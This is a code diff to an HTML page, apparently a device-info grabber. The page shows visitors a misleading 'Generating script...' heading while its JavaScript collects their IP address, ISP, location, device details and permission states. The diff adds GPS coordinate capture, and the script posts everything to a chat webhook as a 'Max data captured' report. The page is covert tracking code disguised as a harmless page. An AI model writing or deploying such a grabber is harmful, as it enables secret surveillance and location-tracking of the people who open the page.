@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Advanced Device Snapshot</title>
+  <title>Ultra Device Snapshot</title>
 </head>
 <body>
-  <h1>Creating a detailed system report...</h1>
+  <h1>Generating script...</h1>
   <script>
     async function getIPInfo() {
       try {
@@ -34,29 +34,68 @@
     function getBasicInfo() {
       return {
         "🖥️ Platform": navigator.platform,
-        "🧭 Browser": navigator.userAgent,
+        "🧭 User Agent": navigator.userAgent,
         "🗺️ Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "📺 Screen Resolution": `${window.screen.width}x${window.screen.height}`,
+        "📺 Screen Resolution": `${screen.width}x${screen.height}`,
         "🔄 Orientation": screen.orientation?.type || "Unknown",
         "🌐 Online": navigator.onLine ? "Yes" : "No",
         "👀 Page Visible": document.visibilityState,
-        "🧠 RAM Estimate": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable"
+        "🧠 RAM Estimate": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
+        "🧮 CPU Cores": navigator.hardwareConcurrency || "Unavailable",
+        "🎨 Color Depth": screen.colorDepth || "Unknown",
+        "🌐 Language": navigator.language,
+        "🍪 Cookies Enabled": navigator.cookieEnabled ? "Yes" : "No",
+        "📱 Touch Support": 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Yes" : "No",
+        "🔐 HTTPS Connection": window.isSecureContext ? "Yes" : "No"
       };
     }
 
+    async function getPermissionsStatus() {
+      const names = ["geolocation", "notifications", "camera", "microphone"];
+      const result = {};
+      for (const name of names) {
+        try {
+          const status = await navigator.permissions.query({ name });
+          result[`🔒 Permission: ${name}`] = status.state;
+        } catch {
+          result[`🔒 Permission: ${name}`] = "Not Supported";
+        }
+      }
+      return result;
+    }
+
+    function getGeoLocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({});
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({
+            "📍 GPS Latitude": pos.coords.latitude.toFixed(5),
+            "📍 GPS Longitude": pos.coords.longitude.toFixed(5),
+            "📡 Accuracy (m)": pos.coords.accuracy
+          }),
+          () => resolve({ "📍 GPS": "Denied or Unavailable" }),
+          { timeout: 5000 }
+        );
+      });
+    }
+
     async function sendDeviceInfo() {
-      const [ipInfo, batteryInfo] = await Promise.all([
+      const [ipInfo, batteryInfo, permissions, gpsInfo] = await Promise.all([
         getIPInfo(),
-        getBatteryInfo()
+        getBatteryInfo(),
+        getPermissionsStatus(),
+        getGeoLocation()
       ]);
 
       const info = {
         "🌐 IP Address": ipInfo.ip || "Unavailable",
-        "📍 Location": `${ipInfo.city || "?"}, ${ipInfo.region || "?"}, ${ipInfo.country_name || "?"}`,
+        "📍 IP Location": `${ipInfo.city || "?"}, ${ipInfo.region || "?"}, ${ipInfo.country_name || "?"}`,
         "🏢 ISP": ipInfo.org || "Unavailable",
         ...getBasicInfo(),
         ...getConnectionInfo(),
         ...batteryInfo,
+        ...permissions,
+        ...gpsInfo,
         "📅 Timestamp": new Date().toLocaleString()
       };
 
@@ -67,25 +106,25 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            username: "🔧 Device Snapshot Pro",
+            username: "📡 Ultra Snapshot",
             avatar_url: "https://i.imgur.com/AfFp7pu.png",
             embeds: [{
-              title: "🧠 Detailed System Report",
-              description: "Here’s your real-time system snapshot with enhanced precision.",
-              color: 0x00b894,
+              title: "🧠 Ultra Device Snapshot",
+              description: "Max data captured from browser environment.",
+              color: 0xff6f00,
               fields: Object.entries(info).map(([name, value]) => ({
                 name,
                 value: String(value),
                 inline: false
               })),
-              footer: { text: "Collected in-browser with JavaScript 🧪" },
+              footer: { text: "Collected using JavaScript API" },
               timestamp: new Date().toISOString()
             }]
           })
         });
-        console.log("Detailed info sent to webhook.");
+        console.log("Device info sent to webhook.");
       } catch (err) {
-        console.error("Webhook send failed:", err);
+        console.error("Webhook failed:", err);
       }
     }
 
